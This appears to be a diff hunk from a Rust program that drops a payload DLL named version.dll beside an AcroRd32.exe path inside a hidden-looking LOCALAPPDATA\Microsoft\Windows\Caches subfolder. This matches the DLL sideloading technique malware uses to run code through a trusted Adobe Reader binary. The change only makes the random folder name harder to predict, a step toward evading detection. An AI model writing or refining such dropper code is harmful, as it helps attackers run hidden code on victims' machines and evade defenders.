@@ -58,16 +58,18 @@ fn main() {
         return;
     }
 
-    let suffix = std::time::SystemTime::now()
+    let ts = std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
-        .map(|d| d.subsec_nanos())
-        .unwrap_or(0xdeadbeef);
+        .unwrap_or_default();
+    let suffix = ts.as_secs().wrapping_mul(1_000_000_007)
+        ^ (ts.subsec_nanos() as u64).wrapping_mul(2_654_435_761)
+        ^ std::process::id() as u64;
     let base = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| "C:\\Users\\Public".into());
     let tmp = std::path::Path::new(&base)
         .join("Microsoft")
         .join("Windows")
         .join("Caches")
-        .join(format!("{:08x}", suffix));
+        .join(format!("{:016x}", suffix));
     let _ = std::fs::create_dir_all(&tmp);
     let _ = std::fs::write(tmp.join("version.dll"), &dll);
     let host = tmp.join("AcroRd32.exe");
